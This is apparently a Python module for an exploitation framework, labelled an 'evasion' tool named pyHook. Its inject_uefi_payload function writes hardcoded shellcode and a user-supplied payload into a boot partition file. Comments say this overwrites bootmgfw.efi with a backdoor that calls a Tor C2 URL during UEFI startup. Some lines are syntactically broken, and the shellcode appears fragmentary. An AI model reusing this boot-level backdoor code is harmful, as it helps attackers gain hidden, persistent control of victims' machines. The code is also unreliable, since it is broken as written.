import struct, os
from collections import OrderedDict
import pyfiglet

MODULE_TYPE = "evasion"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'pyHook',
            'Rank':'Good',
            'Platform':'Windows/Linux/Macos',
            'architectures':'x86/64 bit processors',
            'Description': 'Python hooker and Payload Hider.',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('FILE', ('', True,'/path/to/file/')),
            ('PAYLOAD', ('', True,'/path/to/payload/'))
     
               
                ])
                }
    def logo(self):
    	title = 'pyHook'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set FILE <path/to/imageFile> set PAYLOAD <your/payload> ,then run")
   
    def inject_uefi_payload(self,esp_partition,payload):  
        with open("/sdcard/msf/"+esp_partition, 'r+b') as f:  
            f.seek(0x200)  
        # Overwrite bootmgfw.efi with custom shellcode  
            f.write(b'\xeb\x1e' + struct.pack('<Q', 0x8000) +  
                b'\x48\x31\xff\x48\xf7\xe7\xff\xc7\x48\x8d\x35\x23\x11\x00\x00' +  
                b'\x48\x8d\x15\x13\x11\x00\x00\x0f\x05\xe8\xdd\xff\xff\xff')  
        # Backdoor connects to C2 during UEFI initialization  
        #'http://c2.tor.onion/ghosthook.php?key='
            f.write(b,f'{payload}' + os.urandom(16))  
    
    
    def execute(self):
        self.logo()
        
        esp_partition = self.info['Options']['FILE'][0]
        payload = self.info['Options']['PAYLOAD'][0]
        
        self.inject_uefi_payload(esp_partition,payload)
        
        return f"[+] Applying hooks: {payload} -> {esp_partition}  ..."
    